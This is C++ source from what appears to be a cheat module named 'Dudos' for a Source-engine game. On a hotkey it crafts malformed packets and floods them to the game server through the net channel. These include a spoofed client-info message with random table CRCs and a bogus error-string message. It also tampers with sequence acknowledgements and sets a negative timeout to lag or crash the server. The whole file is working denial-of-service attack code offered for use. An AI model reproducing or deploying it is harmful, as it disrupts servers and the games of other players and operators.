#include "Dudos.h"
#include "../../engine/Engine.h"

void Dudos::Dudos_tick() {
	if (Engine::Var::Instance().SV_Lag.Get()) {
		g_pEngine->ClientCmd("clear");
	}
	if (Engine::Var::Instance().SV_Lag.Get()&&GetAsyncKeyState(Engine::Var::Instance().SV_Lag_Key.Get()) && g_pEngine->GetNetChannelInfo() && !g_pEngine->GetNetChannelInfo()->IsLoopback()) {//  

		bf_write * met = nullptr;
		if (Engine::Var::Instance().SV_Lag_Type.Get() == 0) {
			met = GetMethodOneTap();
		}
		if (Engine::Var::Instance().SV_Lag_Type.Get() == 1) {
			met = GetMethod2();
		}
		if (Engine::Var::Instance().SV_Lag_Type.Get() == 2) {
			met = GetMethod4();
		}
		if (Engine::Var::Instance().SV_Lag_Type.Get() == 3) {
			met = GetMethodTh();
		}
		if (!met) {
			return;
		}

		for (int i = 0; i < Engine::Var::Instance().SV_Lag_Intensity.Get(); i++) {
			g_pEngine->GetNetChannelInfo()->SendDatagram(met);
			g_pEngine->GetNetChannelInfo()->m_nOutSequenceNrAck = g_pEngine->GetNetChannelInfo()->m_nOutSequenceNr;
		}
		g_pEngine->GetNetChannelInfo()->SetTimeout(-1.337f);
	}

}

bf_write * Dudos::GetMethodOneTap()
{
	static byte buff[0x40000];
	static bf_write MethodOneTap;
	player_info_t info;
	CLC_ClientInfo cl_info;
	if (!g_pEngine->GetPlayerInfo(g_pEngine->GetLocalPlayer(), &info)) {
		goto finalstub;
	}
//	if (MethodOneTap.m_iCurBit == 0) {
		ZeroMemory(buff, sizeof(buff));
		MethodOneTap = bf_write("CNetChan_TransmitBits->send", buff, sizeof(buff));
		
		cl_info.m_bIsHLTV = false;

		sprintf_s(cl_info.m_FriendsName, "%s", info.name);
		srand(time(0));
		for (int it = 0; it < 4; it++) {
			cl_info.m_nCustomFiles[it] = rand();
		}
		cl_info.m_nFriendsID = info.userID;
		cl_info.m_nSendTableCRC = rand();
		cl_info.m_nServerCount = g_pClientState->m_nServerCount;
		cl_info.WriteToBuffer(MethodOneTap);
//	}
finalstub:;
	return &MethodOneTap;
}

bf_write * Dudos::GetMethod1() {
	static byte buff[0x40000];
	static bf_write Method1;
	if (Method1.m_iCurBit == 0) {
		ZeroMemory(buff, sizeof(buff));
		Method1 = bf_write("CNetChan_TransmitBits->send", buff, sizeof(buff));
		Method1.WriteByte(9999);
		Method1.WriteString("398274 entities in bone setup array.Should have been cleaned up by now");
		Method1.WriteByte(1);//just an error

	}
	return &Method1;
}

